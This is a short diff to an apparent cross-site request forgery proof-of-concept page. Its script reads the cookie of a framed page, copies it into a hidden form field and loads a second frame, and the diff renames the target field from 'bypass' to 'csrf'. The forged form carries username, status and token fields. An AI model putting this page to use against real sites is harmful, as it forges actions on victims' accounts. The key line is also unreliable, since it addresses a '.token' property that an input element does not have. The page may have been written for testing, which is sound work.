@@ -2,7 +2,7 @@
 var token;
 function readframe1(){
   token = frame1.document.cookie;
-  document.getElementById("bypass").token.value = token
+  document.getElementById("csrf").token.value = token
   loadframe2();
 }
 function loadframe2(){
@@ -23,5 +23,6 @@ height="600" width="800"></iframe>
   <input type="text" name="username" value="z">
   <input type="checkbox" name="status" checked="">        
   <input id="token" type="hidden" name="token" value="0000" />
+  <input id="csrf" type="hidden" name="csrf"/>
   <button type="submit">Submit</button>
 </form>
